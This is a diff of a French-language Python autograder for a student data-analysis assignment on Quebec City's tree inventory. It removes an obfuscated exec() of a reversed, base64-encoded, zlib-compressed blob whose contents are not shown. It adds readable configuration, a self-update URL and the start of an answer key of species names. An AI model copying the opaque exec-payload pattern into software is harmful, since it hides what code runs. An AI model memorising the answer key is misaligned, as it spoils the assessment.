@@ -1,3 +1,1171 @@
-VERSION = "1.0.4"
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
-exec((_)(b'==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'))
+VERSION = "1.0.8"
+
+"""
+autocorrection.py — Validation automatique du TP2 : Analyse de données
+Section validée   : questions d'analyse
+Référence         : Arbres répertoriés dans la Ville de Québec
+"""
+
+import sys
+import os
+import subprocess
+import inspect
+import math
+import numpy as np
+import pandas as pd
+
+# ── Importation optionnelle de requests (nécessaire pour la mise à jour) ────
+try:
+    import requests
+    REQUESTS_DISPONIBLE = True
+except ImportError:
+    REQUESTS_DISPONIBLE = False
+
+# ── Importation du module de l'étudiant ─────────────────────────────────────
+try:
+    import analyse
+except ModuleNotFoundError:
+    print("\033[31m❌ Le fichier analyse.py est introuvable dans le répertoire courant!\033[0m")
+    sys.exit(1)
+except Exception as e:
+    print(f"\033[31m❌ Erreur lors de l'importation de analyse.py :\033[0m")
+    print(f"   {e}")
+    sys.exit(1)
+
+# ════════════════════════════════════════════════════════════════════════════════
+# ⚙️  CONFIGURATION GÉNÉRALE
+# ════════════════════════════════════════════════════════════════════════════════
+
+#URL_MISE_A_JOUR  = "https://REMPLACER_PAR_URL_REELLE/autocorrection.py"  # ← Configurer ici
+URL_MISE_A_JOUR  = "https://raw.githubusercontent.com/departement-info-cem/420-SN1/refs/heads/main/web/static/ressources/tp2/autocorrecteur.py"  # ← Configurer ici
+SCRIPT_TELECHARGEMENT_CSV = "telecharger_arbres_csv.py"  # relancé après chaque mise à jour
+
+# Fonctions de analyse.py validées par l'autocorrecteur, avec leurs paramètres.
+# Chaque paramètre est un tuple (nom, valeur par défaut); OBLIGATOIRE indique
+# qu'aucune valeur par défaut n'est permise.
+OBLIGATOIRE = inspect.Parameter.empty
+SIGNATURES_ATTENDUES = {
+    "question1": [],
+    "question2": [("cardinal", OBLIGATOIRE)],
+    "question3": [("cardinal", OBLIGATOIRE)],
+    "question4": [("nom_lieu", OBLIGATOIRE)],
+    "question5": [],
+    "question6": [("lieu", "Parc Bardy")],
+}
+FONCTIONS_ATTENDUES = list(SIGNATURES_ATTENDUES)
+NB_QUESTIONS     = len(FONCTIONS_ATTENDUES)
+
+
+# ════════════════════════════════════════════════════════════════════════════════
+# 📋  RÉSULTATS ATTENDUS  ←  REMPLACER LES VALEURS PAR LES BONNES RÉPONSES
+# ════════════════════════════════════════════════════════════════════════════════
+#
+# Structure de chaque entrée :
+# Chaque clé est le nom de la fonction à appeler dans analyse.py.
+#
+#   "question"        → intitulé affiché dans la console
+#   "valeur"          → réponse correcte, écrite explicitement ci-dessous
+#   "cas"             → liste de (argument, réponse attendue) pour les fonctions
+#                       qui prennent un paramètre
+#   "type_attendu"    → type Python que la fonction doit retourner
+#   "ordre_important" → (list uniquement) True si l'ordre des éléments compte
+#   "tolerance"       → (dict/float uniquement) écart absolu accepté
+
+RESULTATS_ATTENDUS = {
+    "question1": {
+        "question"        : "Quels noms latins d'espèces distincts sont présents dans le jeu de données?",
+        "valeur"          : """Abies
+Abies Koreana 'Silberlocke'
+Abies alba
+Abies alba 'Pendula'
+Abies balsamea
+Abies concolor
+Abies fraseri
+Abies lasiocarpa
+Acer
+Acer freemanii 'Autumn Blaze'
+Acer freemanii 'Autumn Fantasy'
+Acer freemanii 'Celebration'
+Acer freemanii 'Firefall'
+Acer freemanii 'Marmo'
+Acer freemanii 'Matador'
+Acer freemanii 'Sienna Glen'
+Acer ginnala
+Acer ginnala 'Flame'
+Acer ginnala 'Ruby Sleepers'
+Acer miyabei 'State Street'
+Acer negundo
+Acer negundo 'Baron'
+Acer negundo 'Kelly Gold'
+Acer negundo 'Sensation'
+Acer pensylvanicum
+Acer platanoides
+Acer platanoides 'Alberta Park'
+Acer platanoides 'Cleveland'
+Acer platanoides 'Columnare Compacta'
+Acer platanoides 'Columnare'
+Acer platanoides 'Crimson King'
+Acer platanoides 'Crimson Sentry'
+Acer platanoides 'Deborah'
+Acer platanoides 'Drummondii'
+Acer platanoides 'Emerald Queen'
+Acer platanoides 'Fairview'
+Acer platanoides 'Medzam'
+Acer platanoides 'Pond'
+Acer platanoides 'Royal Red'
+Acer platanoides 'Schwedleri'
+Acer platanoïdes 'Prince Gold'
+Acer platanoïdes 'Superform'
+Acer pseudoplatanus
+Acer pseudoplatanus 'RegalPetticoat'
+Acer rubrum
+Acer rubrum 'Armstrong Gold'
+Acer rubrum 'Armstrong'
+Acer rubrum 'Autumn Flame'
+Acer rubrum 'Bowhall'
+Acer rubrum 'Brandywine'
+Acer rubrum 'Columnare'
+Acer rubrum 'Embers'
+Acer rubrum 'Karpick'
+Acer rubrum 'Morgan'
+Acer rubrum 'Northfire'
+Acer rubrum 'Northwood'
+Acer rubrum 'Red Rocket'
+Acer rubrum 'Red Sunset'
+Acer rubrum 'Redpointe'
+Acer rubrum 'Supersonic'
+Acer saccharinum
+Acer saccharinum 'Laciniatum Wieri'
+Acer saccharinum 'Pyramidale'
+Acer saccharinum 'Sheridan'
+Acer saccharinum 'Silver Queen'
+Acer saccharinum 'Skinner'
+Acer saccharum
+Acer saccharum 'Arrow Head'
+Acer saccharum 'Autumn Faith'
+Acer saccharum 'Autumn Fest'
+Acer saccharum 'Endowment'
+Acer saccharum 'Fairview'
+Acer saccharum 'Fall Fiesta'
+Acer saccharum 'Green Mountain'
+Acer saccharum 'Legacy'
+Acer saccharum 'Seneca Chief'
+Acer saccharum 'Temple Upright'
+Acer saccharum 'Unity'
+Acer saccharum nigrum
+Acer spicatum
+Acer tataricum
+Acer tataricum 'Hot Wings'
+Acer tataricum 'Pattern Perfect'
+Acer tataricum 'Rugged Charm'
+Aesculus
+Aesculus 'Autumn Splendor'
+Aesculus glabra
+Aesculus hippocastanum
+Aesculus x carnea
+Alnus
+Alnus glutinosa
+Alnus glutinosa 'Imperialis'
+Alnus incana 'Aurea'
